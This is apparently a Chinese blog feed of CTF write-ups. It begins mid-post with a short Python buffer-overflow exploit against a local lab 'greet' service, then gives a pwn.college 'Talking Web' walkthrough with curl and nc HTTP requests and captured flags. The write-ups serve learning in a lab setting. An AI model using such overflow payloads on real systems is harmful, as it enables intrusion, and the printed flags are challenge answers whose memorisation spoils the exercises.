number">1</span><span class="token punctuation">)</span>                name_buffer <span class="token operator">=</span> ctypes<span class="token punctuation">.</span>create_string_buffer<span class="token punctuation">(</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"latin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                libgreet<span class="token punctuation">.</span>greet<span class="token punctuation">(</span>name_buffer<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">)</span>                os<span class="token punctuation">.</span>_exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            os<span class="token punctuation">.</span>close<span class="token punctuation">(</span>w<span class="token punctuation">)</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                data <span class="token operator">=</span> os<span class="token punctuation">.</span>read<span class="token punctuation">(</span>r<span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>                    <span class="token keyword">break</span>                <span class="token keyword">yield</span> data            os<span class="token punctuation">.</span>wait<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> stream_greet<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">"Not Found\n"</span><span class="token punctuation">,</span> <span class="token number">404</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hex_value <span class="token operator">=</span> <span class="token string">"c5 f1 29 5f 3c 7f 00 00 "</span>hex_value <span class="token operator">=</span> hex_value<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment"># 去除空格</span>byte_data <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>hex_value<span class="token punctuation">)</span>latin1_string <span class="token operator">=</span> byte_data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'latin-1'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Byte data:"</span><span class="token punctuation">,</span> byte_data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Latin-1 string:"</span><span class="token punctuation">,</span> latin1_string<span class="token punctuation">)</span>url <span class="token operator">=</span> <span class="token string">"http://challenge.localhost/greet"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">248</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">'1'</span> <span class="token operator">*</span> i <span class="token operator">+</span> latin1_string    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> data<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"flag"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"i is </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        hex_output <span class="token operator">=</span> response<span class="token punctuation">.</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>hex_output<span class="token punctuation">)</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-College-Web-Writeup</title>
      <link href="/2024/06/27/pwn-college-web-writeup/"/>
      <url>/2024/06/27/pwn-college-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="pwn-college"><a href="#pwn-college" class="headerlink" title="pwn.college"></a>pwn.college</h1><p><a href="https://pwn.college/intro-to-cybersecurity/talking-web/">https://pwn.college/intro-to-cybersecurity/talking-web/</a></p><h2 id="有价值的问题"><a href="#有价值的问题" class="headerlink" title="有价值的问题"></a>有价值的问题</h2><h3 id="1-工具使用"><a href="#1-工具使用" class="headerlink" title="1. 工具使用"></a>1. 工具使用</h3><p><code>curl</code>工具的用法</p><ul><li>-X 指定请求方法POST GET</li><li>-L 追踪重定向之后的url</li><li>-v 显示详细的请求内容</li><li>-i 输出请求头和响应体</li><li>-H 传递自定义的请求头</li><li>-d 传输的参数或数据</li><li>-c 保存网页传递过来的cookie</li><li>-b 读取文件中的cookie</li></ul><p><code>nc</code></p><ul><li>不支持自动重定向，需要手动检查</li><li>-l  是 <strong>listen（监听）</strong> 的缩写，表示让 Netcat 进入监听模式，等待连接进来。</li><li>-v verbose 使用这个选项后，Netcat 会在终端上打印出更多的连接细节，比如连接状态、IP 地址、端口等信息。</li><li><code>--no-keepalive</code>，请求结束后立即关闭链接。</li></ul><pre class="line-numbers language-none"><code class="language-none">-l 用于指定nc将处于侦听模式。指定该参数，则意味着nc被当作server，侦听并接受连接，而非向其它地址发起连接。-p &lt;port&gt; 暂未用到（老版本的nc可能需要在端口号前加-p参数，下面测试环境是centos6.6，nc版本是nc-1.84，未用到-p参数）-s 指定发送数据的源IP地址，适用于多网卡机-u 指定nc使用UDP协议，默认为TCP-v 输出交互或出错信息，新手调试时尤为有用-w 超时秒数，后面跟数字-z 表示zero，表示扫描时不发送任何数据<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-服务器如何区分http包是由nc工具发送的，还是由python-request库发送的呢？"><a href="#2-服务器如何区分http包是由nc工具发送的，还是由python-request库发送的呢？" class="headerlink" title="2. 服务器如何区分http包是由nc工具发送的，还是由python request库发送的呢？"></a>2. <strong>服务器如何区分http包是由nc工具发送的，还是由python request库发送的呢？</strong></h3><p><strong>关键函数</strong></p><ol><li><p><strong><code>validate_client(name)</code> 函数</strong>：</p><ul><li>这个函数是核心部分，它通过对比客户端进程的路径来确定请求是由哪个工具发出的。</li></ul></li><li><p><strong>路径解析</strong>：</p><ul><li><p>```<br>correct_path = pathlib.Path(shutil.which(name, path=PATH)).resolve()</p><pre class="line-numbers language-none"><code class="language-none">  - 通过 &#96;shutil.which&#96; 方法在系统 PATH 环境变量中查找工具的绝对路径，并解析为绝对路径。- &#96;&#96;&#96;  server_connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>和</p><pre class="line-numbers language-none"><code class="language-none">client_connection<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用 <code>psutil.Process().connections()</code> 和 <code>psutil.net_connections()</code> 获取服务器进程和客户端进程的连接信息。</li><li>确定请求是从哪个客户端进程发出的。</li></ul></li></ul></li><li><p><strong>对比进程路径</strong>：</p><ul><li><p>```<br>client_process = psutil.Process(client_connection.pid)</p><pre class="line-numbers language-none"><code class="language-none">  - 获取客户端进程的 PID，并创建 &#96;psutil.Process&#96; 对象。- &#96;&#96;&#96;  client_path &#x3D; pathlib.Path(client_process.exe())<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>获取客户端进程的可执行文件路径。</li></ul></li><li><p>```<br>validate(“client”, client_path, correct_path)</p><pre class="line-numbers language-none"><code class="language-none">     - 验证客户端进程的路径是否与预期的路径（&#96;curl&#96; 或 &#96;python&#96;）匹配。代码：&#96;&#96;&#96;pythondef validate_client(name):    PATH &#x3D; &quot;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin&quot;    correct_path &#x3D; pathlib.Path(shutil.which(name, path&#x3D;PATH)).resolve()    server_connection &#x3D; next(        connection        for connection in psutil.Process().connections()        if connection.fd &#x3D;&#x3D; request.input_stream.fileno()    )    client_connection &#x3D; next(        connection        for connection in psutil.net_connections()        if connection.raddr &#x3D;&#x3D; server_connection.laddr        and connection.laddr &#x3D;&#x3D; server_connection.raddr    )    client_process &#x3D; psutil.Process(client_connection.pid)    client_path &#x3D; pathlib.Path(client_process.exe())    validate(&quot;client&quot;, client_path, correct_path)def validate(name, value, correct):    assertion_message &#x3D; f&quot;Incorrect &#123;name&#125;: value &#96;&#123;value&#125;&#96;, should be &#96;&#123;correct&#125;&#96;\n&quot;    assert value &#x3D;&#x3D; correct, assertion_message  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>echo -e 输出转义字符</p></li></ol><p>  转义字符指用反斜线字符“\”作为转义字符，来表示那些不可打印的ASCII控制符。譬如 <code>\r \n</code>这些</p><h3 id="3-nc和curl工具的区别"><a href="#3-nc和curl工具的区别" class="headerlink" title="3. nc和curl工具的区别"></a>3. nc和curl工具的区别</h3><p><code>nc</code> (Netcat) 和 <code>curl</code> 是两种不同的网络工具，虽然它们都可以用于网络通信，但它们的功能和用途有显著的区别。</p><h4 id="1-用途和功能"><a href="#1-用途和功能" class="headerlink" title="1. 用途和功能"></a>1. <strong>用途和功能</strong></h4><ul><li><strong><code>nc</code> (Netcat):</strong><ul><li><strong>General-purpose network tool</strong>: <code>nc</code> 是一个通用的网络工具，主要用于读写网络连接。它可以在 TCP 或 UDP 协议上工作，并且能够监听端口、创建反向 shell、传输文件，甚至可以用作简单的服务器。</li><li><strong>Low-level operations</strong>: <code>nc</code> 更接近于底层，它不会自动处理 HTTP 协议细节（如重定向、编码、解码），而是允许你直接发送和接收原始的网络数据包。</li><li><strong>No built-in HTTP support</strong>: 虽然可以用 <code>nc</code> 发送 HTTP 请求，但它不会自动生成 HTTP 头，也不会解析服务器的响应。</li></ul></li><li><strong><code>curl</code>:</strong><ul><li><strong>Dedicated for HTTP and other protocols</strong>: <code>curl</code> 是一个专门用于与各种协议（如 HTTP, HTTPS, FTP, etc.）进行交互的工具。它主要用于下载文件、发送 HTTP 请求、处理 API 调用等。</li><li><strong>High-level operations</strong>: <code>curl</code> 封装了大量的高层操作，如自动跟随重定向、处理 cookies、支持表单数据提交、多种身份验证方法、SSL/TLS 支持等。它使得与 HTTP 协议交互变得非常简单。</li><li><strong>Built-in support for many protocols</strong>: <code>curl</code> 原生支持多种网络协议，不仅限于 HTTP/HTTPS。</li></ul></li></ul><h4 id="2-常见用途"><a href="#2-常见用途" class="headerlink" title="2. 常见用途"></a>2. <strong>常见用途</strong></h4><ul><li><strong><code>nc</code> (Netcat):</strong><ul><li><strong>Port scanning</strong>: 可以用来扫描开放端口。</li><li><strong>Simple server</strong>: 通过监听指定端口，<code>nc</code> 可以作为一个简单的服务器来接收数据。</li><li><strong>Reverse shell</strong>: 在网络安全中，<code>nc</code> 经常用于创建反向 shell 以便于访问远程主机。</li><li><strong>File transfer</strong>: 可以用来在两台主机之间传输文件。</li></ul></li><li><strong><code>curl</code>:</strong><ul><li><strong>HTTP requests</strong>: 用于发送各种类型的 HTTP 请求（GET, POST, PUT, DELETE 等）并处理响应。</li><li><strong>File download/upload</strong>: 通过 HTTP, FTP 等协议下载或上传文件。</li><li><strong>API interaction</strong>: 常用于与 RESTful APIs 进行交互，发送 JSON 数据，接收 JSON 响应。</li><li><strong>Web scraping</strong>: 在需要时可以通过 <code>curl</code> 来获取网页内容。</li></ul></li></ul><h4 id="3-协议支持"><a href="#3-协议支持" class="headerlink" title="3. 协议支持"></a>3. <strong>协议支持</strong></h4><ul><li><strong><code>nc</code> (Netcat):</strong><ul><li><strong>Protocols</strong>: 支持 TCP 和 UDP 传输，但没有内置对高级协议（如 HTTP, FTP, SSL/TLS）的支持。</li></ul></li><li><strong><code>curl</code>:</strong><ul><li><strong>Protocols</strong>: 支持多种高级协议，如 HTTP, HTTPS, FTP, FTPS, SCP, SFTP, SMTP, POP3, IMAP, SMB, TELNET, LDAP 等。</li></ul></li></ul><h4 id="4-使用难度"><a href="#4-使用难度" class="headerlink" title="4. 使用难度"></a>4. <strong>使用难度</strong></h4><ul><li><strong><code>nc</code> (Netcat):</strong><ul><li><strong>Learning curve</strong>: 由于它的低级别和通用性，<code>nc</code> 需要用户对网络通信有较深的理解。它适合用于调试、网络探索或安全研究。</li><li><strong>Manual operation</strong>: 你需要手动构造请求、解析响应。</li></ul></li><li><strong><code>curl</code>:</strong><ul><li><strong>Ease of use</strong>: <code>curl</code> 更加简单易用，尤其是处理 HTTP/HTTPS 请求时。大部分功能已经内置，你只需要使用相应的选项即可。</li><li><strong>Automated operations</strong>: 它自动处理了许多 HTTP 细节，如编码、重定向、身份验证等。</li></ul></li></ul><h4 id="5-示例对比"><a href="#5-示例对比" class="headerlink" title="5. 示例对比"></a>5. <strong>示例对比</strong></h4><ul><li><p><strong>使用 <code>nc</code> 发送 HTTP 请求:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"GET / HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host: example.com<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection: close<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> example.com <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>使用 <code>curl</code> 发送 HTTP 请求:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li><strong><code>nc</code></strong> 是一个功能强大的通用网络工具，适合低级网络任务，如端口扫描、简单服务器设置、文件传输等。</li><li><strong><code>curl</code></strong> 是一个专注于处理多种网络协议的高层工具，特别擅长处理 HTTP 请求，适用于下载文件、与API交互等任务。</li></ul><p><code>nc</code> 更加灵活但需要更多的手动操作，而 <code>curl</code> 更加简单且自动化，适合处理标准协议和任务。</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><p>使用nc构造一个http请求，发送到服务器就行了。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@talking-web~level2:/challenge$ <span class="token builtin class-name">printf</span> <span class="token string">"GET / HTTP/1.0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span>HTTP/1.1 <span class="token number">200</span> OKServer: Werkzeug/3.0.3 Python/3.8.10Date: Thu, <span class="token number">27</span> Jun <span class="token number">2024</span> 02:57:20 GMTContent-Length: <span class="token number">58</span>Server: pwn.collegeConnection: closepwn.college<span class="token punctuation">&#123;</span>QN4lchMdYBn2k2BOiFBvgK6IqMT.dljNyMDL0czNxEzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="命令分解"><a href="#命令分解" class="headerlink" title="命令分解"></a>命令分解</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">"GET / HTTP/1.0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> host.example.com <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol><li><p><strong><code>printf &quot;GET / HTTP/1.0\r\n\r\n&quot;</code></strong>:</p><ul><li><code>printf</code> 是一个用于格式化输出的命令，它将字符串 <code>GET / HTTP/1.0\r\n\r\n</code> 输出到标准输出。</li><li>```<br>“GET / HTTP/1.0\r\n\r\n”<pre class="line-numbers language-none"><code class="language-none">     是一条 HTTP GET 请求。这部分字符串分为以下几个部分：     - &#96;GET&#96;：这是 HTTP 方法，表示获取资源。     - &#96;&#x2F;&#96;：这是请求的路径，在这个例子中是根路径，即首页。     - &#96;HTTP&#x2F;1.0&#96;：这是 HTTP 版本号。     - &#96;\r\n&#96;：这是回车和换行符，表示 HTTP 头部的结束。     - 再一次的 &#96;\r\n&#96;：表示 HTTP 请求头部的结束和请求体的开始。由于 GET 请求没有请求体，所以这部分就结束了整个请求。2. **&#96;|&#96;**:   - 管道符号 (&#96;|&#96;) 将前一个命令的输出传递给下一个命令作为输入。3. **&#96;nc host.example.com 80&#96;**:   - &#96;nc&#96; 是 Netcat 的缩写，是一个网络工具，可以用于读取和写入网络连接。   - &#96;host.example.com&#96; 是目标主机名。   - &#96;80&#96; 是目标端口号，HTTP 默认使用端口 80。### 整体解释该命令通过 &#96;nc&#96; 向指定的服务器 (&#96;host.example.com&#96;) 的端口 80 发送一个手工构建的 HTTP GET 请求。&#96;printf&#96; 命令生成的 HTTP 请求通过管道传递给 &#96;nc&#96;，&#96;nc&#96; 然后将这个请求发送给服务器。服务器处理请求后，会返回一个 HTTP 响应，该响应将显示在终端中。## level 3这个要使用python requests库发送http包才能获取到flag&#96;&#96;&#96;pythonimport requestsresponse &#x3D; requests.get(&#39;http:&#x2F;&#x2F;127.0.0.1:80&#39;)print(response.text)print(response.request.headers)# pwn.college&#123;E5LhFycGy6yYF4ln-T0gK8ZtcRU.dBzNyMDL0czNxEzW&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol><p>即便用nc模拟python的头，还是无法通过检测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">"GET / HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host: 127.0.0.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>User-Agent: python-requests/2.25.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Accept-Encoding: gzip, deflate<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Accept: */*<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Connection: keep-alive<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这次必须要用curl发。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">hacker@talking<span class="token operator">-</span>web<span class="token operator">~</span>level4<span class="token punctuation">:</span><span class="token operator">~</span>$ curl <span class="token operator">-</span>H <span class="token string">"Host: a9b5812fe3df16d707b6f1c5a0c165be"</span> http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">80</span>pwn<span class="token punctuation">.</span>college<span class="token punctuation">&#123;</span>gtnEkBK70at3p5XBaaJ<span class="token operator">-</span>MHbZcrD<span class="token punctuation">.</span>dFzNyMDL0czNxEzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">printf</span> <span class="token string">"GET /13d8cb22c3311435da99d6773d4dd96c HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span>HTTP/1.1 <span class="token number">200</span> OKServer: Werkzeug/3.0.3 Python/3.8.10Date: Thu, <span class="token number">27</span> Jun <span class="token number">2024</span> 07:38:57 GMTContent-Length: <span class="token number">58</span>Server: pwn.collegeConnection: closepwn.college<span class="token punctuation">&#123;</span>glFzdeCtyajxWzcz8Ei8kztjvxa.dVzNyMDL0czNxEzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://127.0.0.1//ea218bfd%20a7e1e4ff/cc048c5a%201da3f711<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>构造URL时需要将空格替换为正确的URL编码每个需要编码的字符都被替换为 <code>%</code> 加上该字符的两位十六进制表示。例如，空格（）编码为 <code>%20</code>，字符 <code>#</code> 编码为 <code>%23</code>。</p><h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>同上，要用nc发</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"GET 路由 HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host:127.0.0.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level-16"><a href="#level-16" class="headerlink" title="level 16"></a>level 16</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"http://127.0.0.1:80/?a=66799705a636a300af5e48b8561fc084&amp;b=5e5c813c%20f8bc26de%2626bd8630%23d7a6e240"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>因为在命令行中，<code>&amp;</code>代表的含义是在后台执行命令，所以为了避免歧义，需要将url用双引号包含起来。</li><li>然后在url传递参数的过程中，因为 <code>#</code>、<code>&amp;</code>、<code>?</code>等有特别含义，所以需要进行编码</li></ul><p><img src="https://laboratory-1304292449.cos.ap-nanjing.myqcloud.com/note/20240903103816.png" alt="20240903103816"></p><h2 id="level-19"><a href="#level-19" class="headerlink" title="level 19"></a>level 19</h2><p><code>curl http://***.***.**.**/api/api -X POST -d &quot;parameterName1=parameterValue1&amp;parameterName2=parameterValue2&quot;</code></p><p><code>curl http://***.***.**.**/api/api -X POST -H &quot;Content-Type:application/json&quot; -d &#39;&#123;&quot;parameterName1&quot;:&quot;parameterValue1&quot;,&quot;parameterName2&quot;:&quot;parameterValue2&quot;&#125;&#39;</code></p><p>这两种请求形式，http数据包有区别吗</p><ol><li>Content-Type:</li></ol><p>第一种请求：没有指定 <code>Content-Type</code>，默认的 <code>Content-Type</code> 为 <code>application/x-www-form-urlencoded</code>。这意味着数据将被编码为表单格式，即 <code>parameterName1=parameterValue1&amp;parameterName2=parameterValue2 </code>这样的键值对。<br>第二种请求：明确指定了 <code>Content-Type: application/json</code>，表示请求体中的数据是JSON格式，即 <code>&#123;&quot;parameterName1&quot;:&quot;parameterValue1&quot;,&quot;parameterName2&quot;:&quot;parameterValue2&quot;&#125;</code>。</p><ol start="2"><li>数据编码:<br>第一种请求的数据在HTTP包中会以URL编码形式发送，类似表单提交。服务器通常会解析这种数据为键值对。<br>第二种请求的数据以JSON格式的纯文本发送，服务器会将其解析为JSON对象。</li><li>服务器解析:<br>在第一种情况下，服务器会将数据解析为普通的表单数据 <code>（application/x-www-form-urlencoded）</code>，一般用于简单的键值对数据传递。<br>在第二种情况下，服务器会期望解析JSON格式的数据，用于传递更复杂的结构化数据。</li></ol><h2 id="level-20"><a href="#level-20" class="headerlink" title="level 20"></a>level 20</h2><p>这个 <code>Content-Length</code>的长度必须要对，不然会多加入 <code>\r</code>和 <code>\n</code>，或者少了一些字母。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@talking-web~level20:~$ <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"POST / HTTP/1.0<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Host:127.0.0.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Type:application/x-www-form-urlencoded<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>Content-Length:34<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>a=3cd954dd825f6a417a2b4f91e739fcd7<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>"</span> <span class="token operator">|</span> <span class="token function">nc</span> <span class="token number">127.0</span>.0.1 <span class="token number">80</span>HTTP/1.1 <span class="token number">200</span> OKServer: Werkzeug/3.0.3 Python/3.8.10Date: Tue, 03 Sep <span class="token number">2024</span> 03:11:43 GMTContent-Length: <span class="token number">58</span>Server: pwn.collegeConnection: closepwn.college<span class="token punctuation">&#123;</span>Y4AFDukL3sK4hTBApxLHWCwphbD.ddDOyMDL0czNxEzW<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="level-29"><a href="#level-29" class="headerlink" title="level 29"></a>level 29</h2><p>这种形式下不需要转义&amp;，是因为传参不再是拼接到url里面进行传参了。</p><p>至于为什么最后一行的 <code>&quot;</code>需要用 <code>\&quot;</code>是因为，想让shell将其当作字符串进行处理，而不是将其视为是字符串的结束标志。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"POST / HTTP/1.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\Host: 127.0.0.1<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\Content-Type: application/json<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\Content-Length: <span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token string">'&#123;"a":"723dea0ce0b6086f8767604c36f07fd8","b":&#123;"c":"a5755b0f","d":["1de2f1a7","4a11da76 a6130af5&amp;1bd198c3#6fd30fed"]&#125;&#125;'</span> <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-c</span><span class="token variable">)</span></span><span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\Connection: close<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\<span class="token entity" title="\r">\r</span><span class="token entity" title="\n">\n</span>\&#123;<span class="token entity" title="\&quot;">\"</span>a<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>723dea0ce0b6086f8767604c36f07fd8<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>b<span class="token entity" title="\&quot;">\"</span>:&#123;<span class="token entity" title="\&quot;">\"</span>c<span class="token entity" title="\&quot;">\"</span>:<span class="token entity" title="\&quot;">\"</span>a5755b0f<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>d<span class="token entity" title="\&quot;">\"</span>:[<span class="token entity" title="\&quot;">\"</span>1de2f1a7<span class="token entity" title="\&quot;">\"</span>,<span class="token entity" title="\&quot;">\"</span>4a11da76 a6130af5&amp;1bd198c3#6fd30fed<span class="token entity" title="\&quot;">\"</span>]&#125;&#125;"</span> <span class="token operator">|</span> 